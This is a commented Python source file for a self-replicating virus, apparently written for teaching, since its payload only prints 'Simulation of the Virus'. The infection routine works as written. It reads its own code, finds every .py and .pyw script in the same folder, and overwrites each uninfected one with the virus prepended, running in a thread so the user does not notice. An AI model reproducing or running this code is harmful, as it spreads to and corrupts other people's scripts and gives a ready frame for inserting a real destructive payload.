### START OF VIRUS ###
import threading, sys, glob

def virus_function():

    #'Code' is the list where the malicious code will be stored later (including the self-replicating code)
    #Then we obtain the name of the current file and open it. Finally, save the file in a variable

    code = []
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    #Evaluate each line of the current file to find where the malicious code begins. When the starting point is found,
    #each line conforming it will be appended to the 'Code' list.

    virus_area = False
    original_area = False
    for line in lines:

        if line == '### START OF VIRUS ###\n':
            virus_area = True
        if line == '    ### END OF ORIGINAL CODE ###\n':
            original_area = False
        if virus_area and not original_area:
            code.append(line)
        if line == '    ### START OF ORIGINAL CODE ###\n':
            original_area = True
        if line == '### END OF VIRUS ###\n':
            break

    #Find every single python script in this same folder and save the names in the 'python_scripts' list.

    python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

    #For every single python script, open it and save it in a variable. Then check if it's infected by detecting the '### START OF VIRUS ###\n' line.
    #If it's not infected, proceed to infect it by first adding the malicious code in the 'Code' list and then the original code that was saved in the
    #'script_code' variable. Save the infected version in the variable 'full_code' and substitute the original code with the infected version overwriting it.

    for script in python_scripts:
        with open (script, 'r') as f:
            script_code = f.readlines()

        infected = False
        for line in script_code:
            if line == '### START OF VIRUS ###\n':
                infected = True
                break

        if not infected:
            full_code = []
            for line in code:
                full_code.append(line)
                if line == '    ### START OF ORIGINAL CODE ###\n':
                    for lines2 in script_code:
                        full_code.append('    ')
                        full_code.append(lines2)
                    full_code.append('\n')
            with open(script, 'w') as f:
                f.writelines(full_code)

    #### Start of Malicious Piece of Code (Payload) ###
    #This is the 'real' malicious code, the harmful event that would occur without interfering in the original code, so that the user wont notice it
    print("Simulation of the Virus")
    #### End of Malicious Piece of Code (Payload) ###

def original_function():
    pass
    ### START OF ORIGINAL CODE ###

    ### END OF ORIGINAL CODE ###

if __name__ == "__main__":
    t1 = threading.Thread(target=virus_function)
    t2 = threading.Thread(target=original_function)

    t1.start()
    t2.start()

    t1.join()
    t2.join()
### END OF VIRUS ###
